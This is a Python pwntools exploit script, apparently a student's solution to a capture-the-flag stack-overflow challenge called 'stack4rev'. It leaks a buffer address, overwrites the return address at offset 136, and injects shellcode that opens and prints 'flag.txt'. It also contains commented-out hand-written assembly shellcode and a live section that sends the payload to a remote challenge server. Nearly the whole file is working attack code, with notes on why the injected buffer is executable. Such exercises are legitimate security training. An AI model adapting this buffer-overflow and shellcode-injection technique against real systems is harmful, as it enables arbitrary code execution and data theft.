# from pwn import *

# context.clear(arch='amd64', log_level='debug')
# context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']

# p = gdb.debug('./stack4rev', gdbscript='''
#     break main 
#     continue
#     ''')
# # p = process(['./stack4rev'])
# # p.sendline(cyclic(200))
# # p.wait()
# # p.corefile
# # offset = cyclic_find(p.corefile.fault_addr)
# offset = 136
# test = p.recvlineS()
# test3 = test.split()
# test2 = p.recvline()
# please = test3[-1][2:]
# addrInt = int(please,16)
# code = asm(shellcraft.amd64.nop())*8+asm(shellcraft.open('flag.txt'))+asm(shellcraft.read(3,'rsp', 0x1000))+asm(shellcraft.write(1,'rsp','rax'))
# payload = flat({0:code,offset: p64(addrInt)})
# p.sendline(payload)
# p.recvall()


# code = asm('''

#     nop
#     nop
#     nop
#     nop
#     nop
#     nop
#     nop
#     nop
#     nop
#     nop
#     nop
#     nop
#     nop

#     push 0x7478
#     mov rax, 0x742e67616c662f2e
#     push rax
#     mov rax, 257
#     mov rdi, rsp
#     xor rsi, rsi
#     xor rdx, rdx
#     syscall

#     mov rsi, rax
#     mov rax, 40
#     mov rdi, 1
#     xor rdx, rdx
#     mov r10, 0xff
#     syscall

#     mov rax, 60
#     syscall


# tempVulnAddr = 0x5563aae01040 
# addr = int.from_bytes(test3[-1],"little")
# print(hex(tempVulnAddr))
# print(addr)
# print(test3[-1])
# print(please)
# print(addrInt)
# print(test3[-1].hex())
# print(hex(addr))
# print(hex(test3[-1]))
# print(type(tempVulnAddr))
# print(type(test3[-1]))
# print(type(addr))
# print(type(test3[-1].hex()))

# p.interactive()


# #Server Solution 

from pwn import *

context.clear(arch='amd64', log_level='debug')
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']


r = remote("cs4401shell2.walls.ninja",31372)
test = r.recvlineS()
test3 = test.split()
test2 = r.recvline()
please = test3[-1][2:]
addrInt = int(please,16)
offset = 136

code = asm(shellcraft.amd64.nop())*8+asm(shellcraft.open('flag.txt'))+asm(shellcraft.read(3,'rsp', 0x1000))+asm(shellcraft.write(1,'rsp','rax'))
payload = flat({0:code,offset: p64(addrInt)})
r.sendline(payload)

r.recvall()
#Notes 
#Global Variables, which _message is, appears to be in the text section of the
#binary. Meaning, we can execute from that point 

#Memory location of _message becomes executable, meaning we can inject shellcode there. 


# code = asm('''

#     push 0x7478
#     mov rax, 0x742e67616c662f2e
#     push rax
#     mov rax, 2
#     mov rdi, rsp
#     xor rsi, rsi
#     xor rdx, rdx
#     syscall

#     mov rsi, rax
#     mov rax, 40
#     mov rdi, 1
#     xor rdx, rdx
#     mov r10, 0xff
#     syscall

#     mov rax, 60
#     syscall

# ''')